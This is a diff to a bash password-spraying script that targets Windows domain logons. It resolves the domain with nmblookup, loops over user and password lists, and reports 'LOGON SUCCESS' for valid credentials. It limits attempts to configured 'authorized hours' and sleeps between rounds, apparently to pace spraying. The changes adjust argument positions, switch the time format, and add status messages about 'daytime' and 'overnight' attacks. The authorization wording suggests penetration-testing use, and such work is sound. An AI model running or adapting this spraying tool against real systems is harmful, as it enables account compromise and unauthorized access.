@@ -12,29 +12,32 @@ while getopts ":n" opt; do
 done
 
 # Set the start and stop times in 24-hour format
-START_TIME=$1
-STOP_TIME=$2
-USERS=$3
-PASSWORDS=$4
-SLEEP=$5
-HOST=$6
+START_TIME=$2
+STOP_TIME=$3
+USERS=$4
+PASSWORDS=$5
+SLEEP=$6
+HOST=$7
 RPCCLIENT=$(which rpcclient)
 NMBLOOKUP=$(which nmblookup)
 DOMAIN="$($NMBLOOKUP -A $HOST | grep GROUP | head -1 | awk '{print $1}')"
 
 # Set the current time
-CURRENT_TIME=$(date +%H)
+CURRENT_TIME=$(date +%H%M)
 
+echo "time_check" $time_check "start" $START_TIME "stop" $STOP_TIME 
 # Loop until the current time is between argument #1 and #2
 if [[ $time_check == "day" ]]; then
   while [[ 10#$CURRENT_TIME -lt 10#$START_TIME || 10#$CURRENT_TIME -ge 10#$STOP_TIME ]]; do
-    sleep 300
-    CURRENT_TIME=$(date +%H)
+    echo "This is a daytime attack. Currently waiting until authorized hours"
+        sleep 300
+    CURRENT_TIME=$(date +%H%M)
   done
 else
   while [[ ! (10#$CURRENT_TIME -ge 10#$START_TIME && 10#$CURRENT_TIME -lt 10#$STOP_TIME) ]]; do
-    sleep 300
-    CURRENT_TIME=$(date +%H)
+    echo "This is a overnight attack. Currently waiting until authorized hours"
+          sleep 300
+    CURRENT_TIME=$(date +%H%M)
   done
 fi
 
@@ -51,7 +54,7 @@ while read PASS; do
             echo "${DOMAIN}\\${USER}:${PASS} - LOGON SUCCESS at $(date)"
         fi
     done < <(cat "$USERS")
-    CURRENT_TIME=$(date +%H)
+    CURRENT_TIME=$(date +%H%M)
     if [[ $ITR -lt $LINES ]]; then
         echo -e "\e[33m[+]\e[0m Sleeping ${SLEEP} seconds."
         sleep ${SLEEP}
@@ -59,4 +62,6 @@ while read PASS; do
     # Check the current time
     if [[ 10#$CURRENT_TIME -lt 10#$START_TIME || 10#$CURRENT_TIME -ge 10#$STOP_TIME ]]; then
         TARGET_DATE=$(date -d "tomorrow $START_TIME" +%s)
-        echo "Pausing - outside authorized hours. Will resume spraying again once the system
+        echo "Pausing - outside authorized hours. Will resume spraying again once the system"
+fi
+done
